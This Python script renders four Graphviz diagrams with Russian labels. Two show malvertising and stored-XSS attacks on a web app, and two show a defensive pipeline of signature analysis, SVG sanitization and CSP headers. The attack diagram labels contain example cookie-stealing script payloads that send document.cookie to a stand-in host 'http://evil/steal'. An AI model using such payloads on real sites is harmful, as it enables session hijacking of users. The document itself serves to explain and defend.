import subprocess, os
FONT = "DejaVu Sans"
HEAD = f'''digraph G {{
  graph [fontname="{FONT}", rankdir=TB, splines=true, nodesep=0.35, ranksep=0.45, pad=0.2, dpi=200, size="7.4,10!", ratio=compress, newrank=true];
  node  [fontname="{FONT}", fontsize=11, shape=box, style="rounded,filled", fillcolor="#ffffff", color="#444444", margin="0.12,0.07"];
  edge  [fontname="{FONT}", fontsize=10, color="#444444", arrowsize=0.8];
'''
RED="#c0392b"; REDBG="#fdecea"; GRN="#1e8449"; GRNBG="#e9f7ef"; BLU="#1f4e79"; BLUBG="#eaf2fb"; YEL="#9a7d0a"; YELBG="#fef9e7"; GRY="#f2f3f4"

def render(name, body, size=None):
    src = HEAD + body + "}\n"
    if size: src = src.replace('size="7.4,10!"', f'size="{size}"')
    open(f"img/{name}.dot","w",encoding="utf-8").write(src)
    subprocess.run(["dot","-Tpng",f"img/{name}.dot","-o",f"img/{name}.png"],check=True)

# ---------------- Рисунок 1: Malvertising ----------------
fig1 = f'''
  subgraph cluster_ext {{ label="Внешняя недоверенная зона"; labeljust=l; style="rounded,dashed"; color="{RED}"; fontcolor="{RED}"; fontsize=12; bgcolor="{REDBG}";
    att   [label="Злоумышленник\\n(рекламодатель-нарушитель)", fillcolor="#f5b7b1", color="{RED}"];
    crea  [label="Вредоносный креатив\\n<div class=\\"ad\\">…\\n<script>new Image().src=\\n\\"http://evil/steal?c=\\"+document.cookie\\n</script></div>", fontname="DejaVu Sans Mono", fontsize=9, fillcolor="#ffffff", color="{RED}"];
    net   [label="Рекламная сеть / биржа (RTB)\\nмодерация пройдена,\\nкреатив попадает в ротацию", fillcolor="#fadbd8", color="{RED}"];
    evil  [label="Сервер атакующего\\nhttp://evil/steal", fillcolor="#f5b7b1", color="{RED}"];
  }}
  subgraph cluster_app {{ label="Защищаемое веб-приложение (доверенная зона)"; labeljust=l; style="rounded"; color="{BLU}"; fontcolor="{BLU}"; fontsize=12; bgcolor="{BLUBG}";
    page  [label="Серверная часть формирует страницу\\n+ рекламный слот <section id=ad-slot>", color="{BLU}"];
    gap   [label="УЯЗВИМОЕ ЗВЕНО\\nкреатив вставляется в HTML без проверки:\\nдоверие каналу доставки = доверие содержимому", shape=box, style="filled,bold", fillcolor="{YELBG}", color="{YEL}", fontcolor="#7d6608"];
  }}
  subgraph cluster_br {{ label="Браузер пользователя (origin защищаемого сайта)"; labeljust=l; style="rounded"; color="#555555"; fontsize=12; bgcolor="{GRY}";
    user  [label="Пользователь\\n(сессия SESSIONID=…)", fillcolor="#d6eaf8", color="{BLU}"];
    exec  [label="Браузер выполняет <script>\\nв контексте origin сайта\\n(нет CSP / разрешён inline)", color="{RED}", fillcolor="#fadbd8"];
    data  [label="Доступные данные:\\ndocument.cookie, DOM,\\nформы, токены", color="{RED}"];
  }}
  eff [label="Последствия:\\n• кража идентификатора сессии (UBI.186)\\n• перенаправление на фишинг / скрытый iframe\\n• подмена содержимого страницы", shape=note, fillcolor="#fdebd0", color="#ca6f1e"];

  att  -> crea [label=" 1. готовит", color="{RED}", fontcolor="{RED}"];
  crea -> net  [label=" 2. загружает как рекламу", color="{RED}", fontcolor="{RED}"];
  user -> page [label=" 3. открывает страницу", color="{BLU}"];
  page -> net  [label=" 4. запрос рекламы", color="{BLU}"];
  net  -> gap  [label=" 5. возвращает\\nкреатив", color="{RED}", fontcolor="{RED}", penwidth=2];
  gap  -> exec [label=" 6. HTML со скриптом\\nпередан браузеру", color="{RED}", fontcolor="{RED}", penwidth=2];
  exec -> data [label=" 7. выполнение", color="{RED}", fontcolor="{RED}"];
  data -> evil [label=" 8. передача данных\\n(GET /steal?c=…)", color="{RED}", fontcolor="{RED}", penwidth=2, style=dashed];
  data -> eff  [style=dotted, arrowhead=none];
  {{rank=same; att; user}}
'''
render("fig1_attack_malvertising", fig1)

# ---------------- Рисунок 2: Stored XSS ----------------
fig2 = f'''
  subgraph cluster_a {{ label="Нарушитель"; labeljust=l; style="rounded,dashed"; color="{RED}"; fontcolor="{RED}"; fontsize=12; bgcolor="{REDBG}";
    att  [label="Злоумышленник\\n(обычный пользователь)", fillcolor="#f5b7b1", color="{RED}"];
    svg  [label="Файл evil.svg\\n<svg xmlns=…>\\n<script>fetch(\\"http://evil/steal?c=\\"\\n+document.cookie)</script>\\n<circle r=\\"40\\"/></svg>", fontname="DejaVu Sans Mono", fontsize=9, color="{RED}"];
    evil [label="Сервер атакующего\\nhttp://evil/steal", fillcolor="#f5b7b1", color="{RED}"];
  }}
  subgraph cluster_app {{ label="Защищаемое веб-приложение"; labeljust=l; style="rounded"; color="{BLU}"; fontcolor="{BLU}"; fontsize=12; bgcolor="{BLUBG}";
    up    [label="POST /upload\\nпринимает файл", color="{BLU}"];
    chk   [label="УЯЗВИМОЕ ЗВЕНО\\nпроверяется только расширение .svg\\nи заявленный MIME-тип;\\nфактическое содержимое не анализируется", style="filled,bold", fillcolor="{YELBG}", color="{YEL}", fontcolor="#7d6608"];
    store [label="Хранилище файлов\\n(сохранён оригинал со скриптом)", shape=cylinder, fillcolor="#d6eaf8", color="{BLU}"];
    serve [label="GET /files/evil.svg\\nContent-Type: image/svg+xml\\nбез CSP / sandbox / nosniff", color="{BLU}"];
  }}
  subgraph cluster_v {{ label="Браузер другого пользователя (жертвы)"; labeljust=l; style="rounded"; color="#555555"; fontsize=12; bgcolor="{GRY}";
    vic  [label="Жертва открывает\\nгалерею / файл", fillcolor="#d6eaf8", color="{BLU}"];
    exec [label="Браузер интерпретирует SVG\\nкак активный документ\\nи выполняет <script>", color="{RED}", fillcolor="#fadbd8"];
    cook [label="Cookie жертвы\\nSESSIONID=…", color="{RED}"];
  }}
  att -> svg   [label=" 1. создаёт", color="{RED}", fontcolor="{RED}"];
  svg -> up    [label=" 2. загружает через\\nштатную форму", color="{RED}", fontcolor="{RED}", penwidth=2];
  up  -> chk   [label=" 3. проверка", color="{BLU}"];
  chk -> store [label=" 4. «файл допустим» →\\nсохранение", color="{RED}", fontcolor="{RED}", penwidth=2];
  vic -> serve [label=" 5. запрашивает файл", color="{BLU}"];
  store -> serve [label=" 6. чтение", color="{BLU}"];
  serve -> exec [label=" 7. ответ с активным\\nсодержимым", color="{RED}", fontcolor="{RED}", penwidth=2];
  exec -> cook [label=" 8. чтение", color="{RED}", fontcolor="{RED}"];
  cook -> evil [label=" 9. передача\\n(GET /steal?c=…)", color="{RED}", fontcolor="{RED}", style=dashed, penwidth=2];
  {{rank=same; att; vic}}
'''
render("fig2_attack_xss", fig2)

# ---------------- Рисунок 3: защита от Malvertising ----------------
fig3 = f'''
  subgraph cluster_ext {{ label="Внешняя зона"; labeljust=l; style="rounded,dashed"; color="{RED}"; fontcolor="{RED}"; fontsize=12; bgcolor="{REDBG}";
    net  [label="Рекламная сеть\\n(креатив со <script>)", fillcolor="#fadbd8", color="{RED}"];
    evil [label="Сервер атакующего\\n(данные не получены)", fillcolor="#f5b7b1", color="{RED}", style="rounded,filled,dashed"];
  }}
  subgraph cluster_app {{ label="Веб-приложение"; labeljust=l; style="rounded"; color="{BLU}"; fontcolor="{BLU}"; fontsize=12; bgcolor="{BLUBG}";
    wa   [label="Рекламный слот:\\nсодержимое НЕ вставляется\\nдо получения решения", color="{BLU}"];
  }}
  subgraph cluster_pat {{ label="Паттерн безопасности (микросервисы в Kubernetes)"; labeljust=l; style="rounded,bold"; color="{GRN}"; fontcolor="{GRN}"; fontsize=12; bgcolor="{GRNBG}";
    col  [label="content_collector\\n• идентификатор, SHA-256\\n• определение типа (html/svg)\\n• извлечение URL, домена", color="{GRN}"];
    ana  [label="analyzer_detector\\n• нормализация (&#…; %xx, разрывы)\\n• 19 сигнатур + признаки URL\\n• суммарный балл и вердикт", color="{GRN}"];
    dec  [label="Балл ≥ 5 ?", shape=diamond, style=filled, fillcolor="#fcf3cf", color="{YEL}", margin="0.02,0.02"];
    res  [label="response_block\\nBLOCK: содержимое не передаётся;\\nдомен рекламодателя → чёрный список", color="{GRN}"];
    ok   [label="ALLOW / SANITIZE\\n(чистый или очищенный блок)", color="{GRN}", fillcolor="#d5f5e3"];
    log  [label="visual_alert\\nжурнал событий + Telegram,\\nметрики Prometheus → Grafana", color="{GRN}"];
    bl   [label="Чёрный список\\nдоменов", shape=cylinder, fillcolor="#d5f5e3", color="{GRN}"];
  }}
  br [label="Браузер пользователя\\nполучает заглушку\\n«блок заблокирован»", fillcolor="#d6eaf8", color="{BLU}"];

  net -> wa  [label=" 1. креатив", color="{RED}", fontcolor="{RED}"];
  wa  -> col [label=" 2. POST /ingest", color="{GRN}"];
  col -> ana [label=" 3. объект + метаданные", color="{GRN}"];
  ana -> dec [label=" 4. вердикт, findings", color="{GRN}"];
  dec -> res [label=" да", color="{RED}", fontcolor="{RED}"];
  dec -> ok  [label=" нет", color="{GRN}"];
  res -> bl  [label=" 5. добавить домен", color="{GRN}"];
  bl -> ana  [label=" 6. синхронизация\\n(повторный креатив\\nблокируется сразу)", style=dashed, color="{GRN}", constraint=false];
  res -> log [label=" 7. событие", color="{GRN}"];
  ok  -> log [color="{GRN}"];
  res -> wa  [label=" 8. решение BLOCK", color="{GRN}", constraint=false];
  wa -> br   [label=" 9. заглушка", color="{BLU}"];
  net -> evil [label=" ✗ скрипт не доставлен", style=dashed, color="{RED}", fontcolor="{RED}", constraint=false];
'''
render("fig3_defense_malvertising", fig3)

# ---------------- Рисунок 4: защита от Stored XSS ----------------
fig4 = f'''
  att  [label="Нарушитель\\nзагружает evil.svg", fillcolor="#f5b7b1", color="{RED}"];
  subgraph cluster_pat {{ label="Паттерн безопасности"; labeljust=l; style="rounded,bold"; color="{GRN}"; fontcolor="{GRN}"; fontsize=12; bgcolor="{GRNBG}";
    v1   [label="1. Валидация (collector + analyzer)\\nрасширение ∈ whitelist, MIME, размер ≤ 256 КБ,\\nфактический тип (sniffing), нет <!DOCTYPE/<!ENTITY", color="{GRN}"];
    d1   [label="Структурное\\nнарушение?", shape=diamond, style=filled, fillcolor="#fcf3cf", color="{YEL}", margin="0.02,0.02"];
    blk  [label="BLOCK\\nHTTP 422, файл отклонён", fillcolor="#fadbd8", color="{RED}"];
    v2   [label="2. Анализ содержимого\\nсигнатуры: <script>, on*=, javascript:,\\nforeignObject, document.cookie …", color="{GRN}"];
    d2   [label="Активное\\nсодержимое?", shape=diamond, style=filled, fillcolor="#fcf3cf", color="{YEL}", margin="0.02,0.02"];
    san  [label="3. Санитизация SVG (белый список)\\nудаляются script, foreignObject, on*,\\nвнешние href; картинка сохраняется", color="{GRN}"];
    rec  [label="4. Повторный анализ результата\\n(остаточный балл < 5)", color="{GRN}"];
    sto  [label="5. Сохранение ТОЛЬКО очищенной версии", shape=cylinder, fillcolor="#d5f5e3", color="{GRN}"];
    log  [label="visual_alert: событие SANITIZE / BLOCK\\n+ метрики", color="{GRN}"];
  }}
  subgraph cluster_srv {{ label="Выдача файла пользователю (глубокая защита)"; labeljust=l; style="rounded"; color="{BLU}"; fontcolor="{BLU}"; fontsize=12; bgcolor="{BLUBG}";
    hdr  [label="Заголовки ответа:\\nContent-Security-Policy: default-src 'none'; sandbox\\nX-Content-Type-Options: nosniff", color="{BLU}"];
    vic  [label="Браузер жертвы:\\nскрипта в файле нет, а при его появлении\\nCSP запрещает выполнение и сетевые запросы", fillcolor="#d6eaf8", color="{BLU}"];
  }}
  evil [label="Сервер атакующего\\n(данные не получены)", fillcolor="#f5b7b1", color="{RED}", style="rounded,filled,dashed"];

  att -> v1 [color="{RED}", fontcolor="{RED}", label=" POST /upload", penwidth=2];
  v1 -> d1;
  d1 -> blk [label=" да", color="{RED}", fontcolor="{RED}"];
  d1 -> v2  [label=" нет"];
  v2 -> d2;
  d2 -> san [label=" да", color="{RED}", fontcolor="{RED}"];
  d2 -> sto [label=" нет (чистый)", constraint=false];
  san -> rec;
  rec -> sto;
  sto -> hdr [label=" GET /files/…", color="{BLU}"];
  hdr -> vic [color="{BLU}"];
  blk -> log [style=dashed]; sto -> log [style=dashed, constraint=false];
  vic -> evil [label=" ✗ запрос заблокирован CSP", style=dashed, color="{RED}", fontcolor="{RED}", constraint=false];
'''
render("fig4_defense_xss", fig4)
print("done")
